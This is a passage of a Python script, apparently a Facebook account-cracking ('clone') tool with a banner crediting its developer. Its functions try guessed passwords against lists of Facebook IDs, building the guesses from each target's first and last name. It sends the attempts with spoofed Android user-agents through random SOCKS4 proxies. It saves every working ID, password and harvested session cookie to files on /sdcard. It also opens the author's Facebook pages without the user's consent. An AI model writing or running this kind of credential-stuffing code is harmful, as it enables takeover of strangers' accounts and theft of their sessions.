...
def sex():
	...
	density = random.choice(['2.8'])
	width = random.choice(['2400'])
	height = random.choice(['2400'])
	ua =f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV{str(fbrv)};FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 12;FBSV/13;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#__________________LOGO____________#
os.system('xdg-open https://www.facebook.com/AjairaPublic143?mibextid=ZbWKwL/?ref=share')
logo=(f"""
{G1}  AAA    SSSSS  HH   HH EEEEEEE  SSSSS  
{G1} AAAAA  SS      HH   HH EE      SS      
{G1}AA   AA  SSSSS  HHHHHHH EEEEE    SSSSS  
{G1}AAAAAAA      SS HH   HH EE           SS 
{G1}AA   AA  SSSSS  HH   HH EEEEEEE  SSSSS  
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}={G1}]{G1} DEVELOPER {A}➢{G1} EVAN AHAMED RAKIB 
{G1}[{A}={G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}={G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.0.1
{G1}[{A}={G1}]{G1} GITHUB    {A}➢{G1} EVAN-444
{G1}[{A}={G1}]{G1} STATUS    {A}➢{G1} PERSONAL
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
#    print(f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')
    ...
    if sex in ['1']:
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000544155541');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def file():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}ARAFAT.txt');linex()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}EVAN-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}ASHES-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/ARAFAT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}ASHES-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
...
def M1(ids,names,psd):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}ASHES-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ...
        for pw in psd:
            pas = pw.replace('first last',fn.lower()).replace('firstlast',fn).replace('59039200',ln.lower()).replace('57273200',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}ASHES-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/ASHES- FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M} ASHES-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/ASHES-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
